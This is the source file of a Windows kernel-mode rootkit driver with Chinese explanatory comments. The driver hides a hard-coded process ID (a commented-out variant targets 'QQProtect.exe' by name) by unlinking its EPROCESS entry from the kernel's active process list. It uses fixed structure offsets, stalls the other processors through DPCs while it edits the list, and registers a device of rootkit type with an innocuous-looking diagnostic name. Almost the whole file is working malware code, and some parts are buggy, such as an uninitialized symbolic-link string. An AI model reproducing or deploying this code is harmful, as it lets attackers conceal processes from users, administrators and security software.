#include <ntddk.h>
#include "datatype.h"
#include "dbgmsg.h"
#include "ctrlcode.h"
#include "device.h"
// 使用 build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  命令编译该驱动源文件
//#define MEM_TAG  "UseForCopyFile"
// 注意：此驱动通过sc.exe加载至内核空间时，会使用自身实现的同步机制来访问全局的活动进程链表，然后隐藏
//指定pid的进程，但此驱动卸载时并不会还原对链表的修改，因此不会重现目标进程。需要编写另外的逻辑在
// 驱动卸载时重现隐藏的进程（或者重启系统也可以）
//需要在多核系统上测试此驱动的互斥访问逻辑是否能够正常运作，反之则会导致bugcheck蓝屏

#define EPROCESS_OFFSET_PID				0xb4		//即 EPROCESS.UniqueProcessId ，偏移量为 0xb4 字节
#define EPROCESS_OFFSET_NAME				0x16c		//即 EPROCESS.ImageFileName ，偏移量为 0x16c 字节
#define EPROCESS_OFFSET_LINKS				0xb8			//即 EPROCESS.ActiveProcessLinks ，偏移量为 0xb8 字节
#define SZ_EPROCESS_NAME					0x010	// 原始文档定义中，进程名称存储在长度为15个字节字符数组中，
											// 这里把长度该为16是为了把最后一个元素赋值为\0结尾标志


/* MSNetDigaDeviceObject代表我们创建的设备 */
PDEVICE_OBJECT MSNetDiagDeviceObject;
/* DriverObjectRef代表我们注册的驱动 */
PDRIVER_OBJECT DriverObjectRef;
KIRQL  RaiseIRQL();
PKDPC  AcquireLock();
NTSTATUS  ReleaseLock(PVOID  dpc_pointer);
void  LowerIRQL(KIRQL  prev);
void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2);
//extern void NOP_FUNC(void);
BYTE*  getNextEPROCESSpointer(BYTE*  currentEPROCESSpointer);
//BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
BYTE*  getPreviousEPROCESSpointer(BYTE*  currentEPROCESSpointer);
//BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
void  getProcessName(char  *dest, char  *src);
int  getPID(BYTE*  currentEPROCESSpointer);
//unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer);
void  WalkProcessList(DWORD  pid);
//void  WalkProcessListWithName(unsigned char* trg_proc_nme);
void  HideProcess(DWORD*  pid);
//void  HideProcessWithName(unsigned char* trg_proc_nme);
void  adjustProcessListEntry(BYTE*  currentEPROCESSpointer);
//void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer);
void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength);
NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);



NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject);
NTSTATUS RegisterDriverDeviceLink();
//这二个作为全局变量，否则无法通过编译（报错：局部变量未初始化）

KIRQL  old_irql;
KSPIN_LOCK  get_spin_lock;


// 下面的3个全局变量用于在多处理器系统上同步对OS资源的访问
 
PKDPC  dpcPointer;		//一个指针，指向由 DPC（延迟过程调用）对象构成的数组；每处理器/核被分配一个此类数组；每处理器上的 DPC
					// 例程运行在 DISPATCH_LEVEL 级，因此可以挂起该处理器/核上运行的 OS的线程调度代码实现同步。
DWORD has_finished_access_os_res;		//当完成对OS资源的同步访问时，应将此标志置1
DWORD nCPUsLocked;		//标识当前被同步了的（运行在 DISPATCH_LEVEL）CPU/核数量，此变量应该通过 InterLocked*() 系列例程原子地进行读写
// 声明一个位于外部汇编源文件（.../amd64/lib.asm）中的函数，它仅仅执行 nop 空指令

// 该文件内容如下：
// 该文件仅用于为 AMD64 体系结构（指定了 /amd64 构建选项时用），对于默认的 x86/i386 构建选项，无需声明该外部函数，
// 而是用内联汇编语句 __asm{nop;}
/*
.CODE
public NOP_FUNC
NOP_FUNC PROC
nop
ret
NOP_FUNC ENDP
END
*/


VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pdeviceObj;
	UNICODE_STRING unicodeString;
	DBG_TRACE("OnUnload","Received signal to unload the driver");
	pdeviceObj = (*DriverObject).DeviceObject;
	if(pdeviceObj != NULL)
	{
		DBG_TRACE("OnUnload","Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		DBG_TRACE("OnUnload","Unregistering driver's device name");
		IoDeleteDevice((*DriverObject).DeviceObject);
	}
	return ;
}


/* 
 * DriverObject相当于注册的驱动，DeviceObject为对应某个驱动设备
 * 一个驱动可以创建多个设备，然后通过DriverObject::DeviceObject和
 * DeviceObject::NextDevice遍历整个设备链表
 */
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	//因为 DriverEntry() 运行在 PASSIVE_LEVEL 中断级，所有只能在 PASSIVE_LEVEL 调用的内核例程都应该放在 DriverEntry()
	//内部调用，包括使用 DbgPrint() 打印 unicode 字符串时
	//  WDK 中定义的部分数据类型与传统 C 标准的数据类型对应关系如下：
	// ULONG -> unsigned long
	// UCHAR -> unsigned char
	// UINT -> unsigned int
	// VOID -> void 
	// PULONG ->unsigned long* 
	// PUCHAR -> unsigned char*
	// PUINT -> unsigned int*
	// PVOID -> void*
	
	//unsigned char*  target_hide_process_name = 'QQProtect.exe\0'
	DWORD proc_pid = 1548;

	

	LARGE_INTEGER clock_interval_count_since_booted;
									//所有的内部变量都必须首先定义
	int i;						//这个必须放在最前面，否则无法通过编译
	ULONG  millsecond_count_per_clock;
	ULONG  l00nanosecond_count_per_clock;
	NTSTATUS  ntStatus;	//这个必须放在最前面，否则无法通过编译
	ULONG  data_length;
	HANDLE  my_key_handle = NULL;
	NTSTATUS  returnedStatus;
	

	UNICODE_STRING  my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	UNICODE_STRING  my_key_name = RTL_CONSTANT_STRING(L"SystemRoot");
	KEY_VALUE_PARTIAL_INFORMATION  not_complete_key_infor;
	PKEY_VALUE_PARTIAL_INFORMATION  acturally_use_key_infor;
	ULONG  acturally_key_value_length;
	OBJECT_ATTRIBUTES   my_obj_attr;
	InitializeObjectAttributes(&my_obj_attr, &my_key_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
	returnedStatus = ZwOpenKey(&my_key_handle, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(returnedStatus)) {
		DBG_TRACE("Driver Entry", ".................cannot open registry key...........");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
																&my_key_name,
																KeyValuePartialInformation,
																&not_complete_key_infor,
																sizeof(KEY_VALUE_PARTIAL_INFORMATION),
																&acturally_key_value_length);

	if (!NT_SUCCESS(returnedStatus)
		&& returnedStatus != STATUS_BUFFER_OVERFLOW
		&& returnedStatus != STATUS_BUFFER_TOO_SMALL) {
		DBG_TRACE("Driver Entry", ".................you pass the wrong arg or the key value...........");
	}

acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, acturally_key_value_length, 'MyTg');
	if (acturally_use_key_infor == NULL) {
		returnedStatus = STATUS_INSUFFICIENT_RESOURCES;
		DBG_TRACE("Driver Entry", "..........................cannot allocate kernel mode heap memory.........................");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
																&my_key_name,
																KeyValuePartialInformation,
																acturally_use_key_infor,
																acturally_key_value_length,
																&acturally_key_value_length);

	if (NT_SUCCESS(returnedStatus)) {
		for (data_length = 0;  data_length < acturally_use_key_infor->DataLength;  data_length++) {
			DbgPrint("the SystemRoot=   %c\n",  acturally_use_key_infor->Data[data_length]);
		}
		
			
	} else { 
		DBG_TRACE("Driver Entry", ".................query registry key value failed......................"); 
	}
	//注意，DbgPrint 例程不支持任何浮点类型（%f、%e、%E、%g、%G、%a 或 %A），因此打印浮点数会造成系统崩溃
	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);
	
	DbgPrint("................per system clock interval is   %u   millseconds...............", millsecond_count_per_clock);
	KeQueryTickCount(&clock_interval_count_since_booted);
	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................",  clock_interval_count_since_booted.LowPart);
	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................",  clock_interval_count_since_booted.HighPart);
	//系统中断次数乘以每中断的毫秒数就得到启动以来经历的毫秒数
	
	HideProcess(&proc_pid);
	//HideProcessWithName(target_hide_process_name);

	DBG_TRACE("Driver Entry","Driver has benn loaded");
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		(*DriverObject).MajorFunction[i] = defaultDispatch;
	}
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;

	DBG_TRACE("Driver Entry","Registering driver's device name");
	ntStatus = RegisterDriverDeviceName(DriverObject);
	if(!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry","Failed to create device");
		return ntStatus;
	}

	DBG_TRACE("Driver Entry","Registering driver's symbolic link");
	if(!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry","Failed to create symbolic link");
		return ntStatus;
	}
	DriverObjectRef = DriverObject;
	return STATUS_SUCCESS;
}
/*
 * IRP.IoStatus : 类型为IO_STATUS_BLOCK
 * A driver sets an IRP's I/O status block to indicate the final status of 
 * an I/O request, before calling IoCompleteRequest for the IRP.
 typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID    Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK

  Status: This is the completion status, either STATUS_SUCCESS if the 
          requested operation was completed successfully or an informational, 
          warning, or error STATUS_XXX value. 
  Information: This is set to a request-dependent value. For example, 
          on successful completion of a transfer request, this is set 
		  to the number of bytes transferred. If a transfer request is 
		  completed with another STATUS_XXX, this member is set to zero.

 */



NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	/*
	 The IoCompleteRequest routine indicates that the caller has 
	 completed all processing for a given I/O request and is 
	 returning the given IRP to the I/O manager.
	 */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}
/*
 * I/O堆栈单元由IO_STACK_LOCATION定义，每一个堆栈单元都对应一个设备对象。
 * 我们知道，在一个驱动程序中，可以创建一个或多个设备对象，而这些设备对象
 * 都对应着一个IO_STACK_LOCATION结构体，而在驱动程序中的多个设备对象，而
 * 这些设备对象之间的关系为水平层次关系。
 * Parameters 为每个类型的 request 提供参数，例如：Create(IRP_MJ_CREATE 请求），
 * Read（IRP_MJ_READ 请求），StartDevice（IRP_MJ_PNP 的子类 IRP_MN_START_DEVICE）
 * 
	//
	// NtDeviceIoControlFile 参数
	//
	struct
	{
		ULONG OutputBufferLength;
		ULONG POINTER_ALIGNMENT InputBufferLength;
		ULONG POINTER_ALIGNMENT IoControlCode;
		PVOID Type3InputBuffer;
	} DeviceIoControl;
	在DriverEntry函数中，我们设置dispatchIOControl处理IRP_MJ_DEVICE_CONTROL
	类型的请求，因此在dispatchIOControl中，我们只关心IOCTL请求，Parameters中
	只包含DeviceIoControl成员
 */




NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	PIO_STACK_LOCATION irpStack;
	PVOID inputBuffer;
	PVOID outputBuffer;
	ULONG inBufferLength;
	ULONG outBufferLength;
	ULONG ioctrlcode;
	NTSTATUS ntStatus;
	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;

	DBG_TRACE("dispatchIOControl","Received a command");
	switch(ioctrlcode)
	{
	case IOCTL_TEST_CMD:
		{
			TestCommand(inputBuffer, outputBuffer, inBufferLength, outBufferLength);
			((*IRP).IoStatus).Information = outBufferLength;
		}
		break;
	default:
		{
			DBG_TRACE("dispatchIOControl","control code not recognized");
		}
		break;
	}
	/* 在处理完请求后，调用IoCompleteRequest */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return(ntStatus);
}




void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength)
{
	char *ptrBuffer;
	DBG_TRACE("dispathIOControl","Displaying inputBuffer");
	ptrBuffer = (char*)inputBuffer;
	DBG_PRINT2("[dispatchIOControl]: inputBuffer=%s\n", ptrBuffer);
	DBG_TRACE("dispatchIOControl","Populating outputBuffer");
	ptrBuffer = (char*)outputBuffer;
	ptrBuffer[0] = '!';
	ptrBuffer[1] = '1';
	ptrBuffer[2] = '2';
	ptrBuffer[3] = '3';
	ptrBuffer[4] = '!';
	ptrBuffer[5] = '\0';
	DBG_PRINT2("[dispatchIOControl]:outputBuffer=%s\n", ptrBuffer);
	return;
}




BYTE*  getNextEPROCESSpointer(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}




BYTE*  getPreviousEPROCESSpointer(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}




void  getProcessName(char  *dest,  char  *src)
{
	//		BYTE					BYTE*
	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) 进程映像名，复制长度为16字节 
	strncpy(dest, src, SZ_EPROCESS_NAME);

	// 最后一个元素（16-1=15）为表示字符串结尾的\0 字符
	dest[SZ_EPROCESS_NAME - 1] = '\0';

	return;
}



int  getPID(BYTE*  currentEPROCESSpointer)
{
	int  *pid;
	pid = (int *)(currentEPROCESSpointer + EPROCESS_OFFSET_PID);
	return (*pid);
}



void  HideProcess(DWORD*  pid){
	//首先同步对由 EPROCESS 结构组成的双向链表的访问，实际的访问是在 WalkProcessList() 函数中进行的，为了确保 WalkProcessList()
	//在遍历链表中的节点时，同一时间不会有其它线程也对该链表执行插入或删除操作，这里使用自旋锁来同步。
	//另外，加锁操作会把 IRQL 提升到 DISPATCH_LEVEL ，导致缺页异常处理函数无法执行页面换入操作，因此程序员要确保希望访问的
	//内核内存映射到的物理页面不会被换出到磁盘上。（EPROCESS 结构在非换页池中分配，因此没有这个问题）
	//KeAcquireSpinLock-KeReleaseSpinLock 会自动提升和恢复 IRQL 因此没有必要进行多余的 KeRaiseIrql-KeLowerIrql 操作
	
	/*KeInitializeSpinLock(&get_spin_lock);
	KeAcquireSpinLock(&get_spin_lock, &old_irql);
	WalkProcessList(*pid);
	KeReleaseSpinLock(&get_spin_lock, old_irql);*/
	
	// 上面使用自旋锁系列的函数在单处理器/核上，或者虚拟机上，可以成功同步对OS资源的访问；
	//而在多处理器/核系统上，需要使用另外的机制来同步对OS资源的访问——将包含 WalkProcessList() 调用前后的代码替换成如下：
   
	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
     WalkProcessList(*pid);
     ReleaseLock(dpcPointer);
     LowerIRQL(old_irql);
   

	return;

}



void  WalkProcessList(DWORD  pid)
{
	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	int  currentPID = 0;
	int  targetPID = 0;

	//此局部数组长度为15字节（下标从0到15）
	BYTE  processName[SZ_EPROCESS_NAME];

	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();
	/*
	0: kd> dt nt!_KTHREAD Tcb ServiceTable be28bca0
	+0x0bc ServiceTable : 0x843b5b00 Void
	0: kd> dd 843b5b00 L4
	843b5b00  842ca43c 00000000 00000191 842caa84
	0: kd> ? KiServiceTable
	Evaluate expression: -2077449156 = 842ca43c
	0: kd> dps 842ca43c L4
	842ca43c  844c5fbf nt!NtAcceptConnectPort
	842ca440  8430d855 nt!NtAccessCheck
	842ca444  84455d47 nt!NtAccessCheckAndAuditAlarm
	842ca448  84271897 nt!NtAccessCheckByType
	0: kd>
	PETHREAD	currentThread;
	PVOID  ki_service_table;
	currentThread = PsGetCurrentThread();
	ki_service_table = &(currentThread->Tcb.ServiceTable);

	*/

	currentPID = getPID(currentEPROCESSpointer);

	//把进程映像名称复制到本地数组processName内，设定最后一个字符为\0
	getProcessName(processName, (currentEPROCESSpointer + EPROCESS_OFFSET_NAME));
	targetPID = currentPID;

	if (pid == currentPID)
	{
		adjustProcessListEntry(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , pid =  %u..........................", pid);
		return;
	}
	

	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	currentPID = getPID(currentEPROCESSpointer);
	getProcessName(processName,  currentEPROCESSpointer + EPROCESS_OFFSET_NAME);


	// while 循环退出的条件是：targetPID == currentPID，因为前面的代码逻辑将 targetPID 初始化为当前执行进程的 PID，
	//然后保持不变，并且当前执行进程的 EPROCESS 结构作为链表头，这样 targetPID 就能够标识表头进程
	//另一方面，局部变量 currentPID 在每一次循环的迭代中都被更新，当 currentPID 等于 targetPID 时，说明本次迭代到达了链表的结尾
	//（结尾表项的 LIST_ENTRY.Flink 指向表头的 LIST_ENTRY.Flink），即 currentPID 再次被更新为表头进程的 PID 时，退出循环。
	while (targetPID != currentPID)
	{
		if (currentPID == pid)
		{
			adjustProcessListEntry(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , pid =  %u............................", pid);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		currentPID = getPID(currentEPROCESSpointer);
		getProcessName(processName, (currentEPROCESSpointer + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == walkThreshold)
		{
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for PID =  %u\n.............................", pid);
	return;
}




void  adjustProcessListEntry(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;
	int  currentPID = 0;
	int  prevPID = 0;
	int  nextPID = 0;
	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
	LIST_ENTRY*  nextListEntry;

	currentPID = getPID(currentEPROCESSpointer);
	prevEPROCESSpointer = getPreviousEPROCESSpointer(currentEPROCESSpointer);
	prevPID = getPID(prevEPROCESSpointer);

	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
	nextPID = getPID(nextEPROCESSpointer);

	//分别取得当前和相邻的 2 个 ERROCESS 的 ActiveProcessLinks 字段（一个 LIST_ENTRY 对象）

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

	//分别修改三者中的特定字段（Flink 或 Blink），实现隐藏当前的 ERROCESS

	//前一个 ERROCESS  的 ActiveProcessLinks.Flink 指向下一个 ERROCESS  的 ActiveProcessLinks.Flink
	//下一个 ERROCESS  的 ActiveProcessLinks.Blink 指向前一个 ERROCESS  的 ActiveProcessLinks.Flink
	//这就绕过了当前（中间）的 ERROCESS 的 ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	//当前 ERROCESS 的 ActiveProcessLinks.Flink 与 ActiveProcessLinks.Blink 指向 ActiveProcessLinks 自身，从链表中分离
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}





NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	/* 利用DeviceNameBuffer来初始化unicodeString */
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	/*
	 * 创建一个设备，设备类型为FILE_DEVICE_RK（由我们自己在device.h中定义)，
	 * 创建的设备保存在MSNetDiagDeviceObject中
	 */
	ntStatus = IoCreateDevice
		(
		    DriverObject,
			0,
			&unicodeString,
			FILE_DEVICE_RK,
			0,
			TRUE,&MSNetDiagDeviceObject
		);
	return (ntStatus);
}





NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
	/*
	 * IoCreateSymbolicLink创建一个设备链接。驱动程序中虽然注册了设备，
	 * 但它只能在内核中可见，为了使应用程序可见，驱动需哟啊暴露一个符号
	 * 链接，该链接指向真正的设备名
	 */
	ntStatus = IoCreateSymbolicLink(&unicodeLinkString, &unicodeString);
	return (ntStatus);
}


//下面这些函数用于在SMP系统上同步对Windows内核资源的访问，它们要么直接或间接在 HideProcess() 中被调用：

KIRQL  RaiseIRQL() {
		KIRQL  curr;
		KIRQL  prev;
		curr = KeGetCurrentIrql();
		if (curr < DISPATCH_LEVEL) {
				KeRaiseIrql(DISPATCH_LEVEL,  &prev);
		}
		prev = curr;
		return prev;
}


PKDPC  AcquireLock() {
		PKDPC  dpcArray;
		DWORD  current_cpu;
		DWORD  i;
		DWORD  nOtherCPUs;
		if (KeGetCurrentIrql() != DISPATCH_LEVEL) {
				return  NULL;
		}
		DBG_TRACE("AcquireLock",  "current cpu Executing at IRQL == DISPATCH_LEVEL");
		InterlockedAnd(&has_finished_access_os_res,  0);
		InterlockedAnd(&nCPUsLocked,  0);
		DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n",  KeNumberProcessors);// %u:  无符号十进制整数。

		//此处的 ExAllocatePoolWithTag() 调用语句的参数部分需要换行书写，否则由于未知原因，会报错该函数未定义
		dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
			KeNumberProcessors * sizeof(KDPC), 0xABCD);
		if (dpcArray == NULL) {
				return  NULL;
		}
		current_cpu = KeGetCurrentProcessorNumber();
		DBG_PRINT2("[AcquireLock]:  current_cpu = Core %u\n",  current_cpu);
		for (i = 0;  i < KeNumberProcessors;  i++) {
				PKDPC  dpcPtr  =  &(dpcArray[i]);
				if ( i != current_cpu) {
						KeInitializeDpc(dpcPtr,  lockRoutine,  NULL);
						KeSetTargetProcessorDpc(dpcPtr,  i);
						KeInsertQueueDpc(dpcPtr,  NULL,  NULL);
				}
		}
		nOtherCPUs = KeNumberProcessors - 1;
		InterlockedCompareExchange(&nCPUsLocked,  nOtherCPUs,  nOtherCPUs);
		while (nCPUsLocked != nOtherCPUs) {
			__asm {
				nop;
				}
				InterlockedCompareExchange(&nCPUsLocked,  nOtherCPUs,  nOtherCPUs);
		}
		DBG_TRACE("AcquireLock",  "All the other CPUs have been raise to DISPATCH_LEVEL and entered nop-loop, now we can call WalkProcessList() to mutex access resource");
		return  dpcArray;
}


void  lockRoutine(IN  PKDPC  dpc,  IN  PVOID  context,  IN  PVOID  arg1,  IN  PVOID  arg2) {
		DBG_PRINT2("[lockRoutine]:   CPU[%u]  entered nop-loop",  KeGetCurrentProcessorNumber());
		InterlockedIncrement(&nCPUsLocked);
		while (InterlockedCompareExchange(&has_finished_access_os_res,  1,  1) == 0) {
			__asm {
				nop;
				}
		}
		InterlockedDecrement(&nCPUsLocked);
		DBG_PRINT2("lockRoutine]:   CPU[%u]  exited nop-loop",  KeGetCurrentProcessorNumber());
		return;
}


NTSTATUS  ReleaseLock(PVOID  dpc_pointer) {
		InterlockedIncrement(&has_finished_access_os_res);
		InterlockedCompareExchange(&nCPUsLocked,  0,  0);
		while (nCPUsLocked != 0) {
			__asm {
				nop;
				}
				InterlockedCompareExchange(&nCPUsLocked,  0,  0);
		}
		if (dpc_pointer != NULL) {
				ExFreePool(dpc_pointer);
		}
		DBG_TRACE("ReleaseLock",  "All the other CPUs have been exited nop-loop and down to origional IRQL, and these dpc have been released");
		return STATUS_SUCCESS;
}


void  LowerIRQL(KIRQL  prev) {
		KeLowerIrql(prev);
		DBG_TRACE("LowerIRQL",  "current cpu also down to origional IRQL");
		return;
}




/*


void  HideProcessWithName(unsigned char* trg_proc_nme){

	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
     WalkProcessListWithName(trg_proc_nme);
     ReleaseLock(dpcPointer);
     LowerIRQL(old_irql);
   

	return;

}



void  WalkProcessListWithName(unsigned char* trg_proc_nme){


	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	unsigned char*  current_proc_name = NULL;
	unsigned char*  target_proc_name = NULL;


	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();


	current_proc_name = get_proc_name(currentEPROCESSpointer);


	target_proc_name = current_proc_name;

	if ( stricmp(trg_proc_nme, current_proc_name) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}



	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	current_proc_name = get_proc_name(currentEPROCESSpointer);

// 代码执行到此处，current_proc_name：下一个进程名称
//				target_proc_name：当前进程名称
//				nextEPROCESSpointer：指向下一个进程
//				currentEPROCESSpointer：指向下一个进程
// 画出此函数的逻辑流程
// while 循环退出的条件是：target_proc_name == current_proc_name，因为前面的代码逻辑将 target_proc_name 初始化为当前执行进程的名称，
//然后保持不变，并且当前执行进程的 EPROCESS 结构作为链表头，这样 target_proc_name 就能够标识表头进程名称
//另一方面，局部变量 current_proc_name 在每一次循环的迭代中都被更新，当 current_proc_name 等于 target_proc_name 时，
说明本次迭代到达了链表的结尾
//（结尾表项的 LIST_ENTRY.Flink 指向表头的 LIST_ENTRY.Flink），即 current_proc_name 再次被更新为表头进程的 PID 时，退出循环。

	while ( stricmp(target_proc_name, current_proc_name) != 0 )
	{
		if ( stricmp(trg_proc_nme, current_proc_name) == 0 ){
			adjustProcessListEntryWithProcName(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , name =  %s............................", current_proc_name);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		current_proc_name = get_proc_name(currentEPROCESSpointer);

		fuse++;

		if (fuse == walkThreshold){
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for name =  %s\n.............................", target_hide_process_name);
	return;


}


void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;


	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
	LIST_ENTRY*  nextListEntry;

	prevEPROCESSpointer = getPreviousEPROCESSpointer(currentEPROCESSpointer);
	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);

	//分别取得当前和相邻的 2 个 ERROCESS 的 ActiveProcessLinks 字段（一个 LIST_ENTRY 对象）

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

	//分别修改三者中的特定字段（Flink 或 Blink），实现隐藏当前的 ERROCESS

	//前一个 ERROCESS  的 ActiveProcessLinks.Flink 指向下一个 ERROCESS  的 ActiveProcessLinks.Flink
	//下一个 ERROCESS  的 ActiveProcessLinks.Blink 指向前一个 ERROCESS  的 ActiveProcessLinks.Flink
	//这就绕过了当前（中间）的 ERROCESS 的 ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	//当前 ERROCESS 的 ActiveProcessLinks.Flink 与 ActiveProcessLinks.Blink 指向 ActiveProcessLinks 自身，
	//从链表中分离
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}


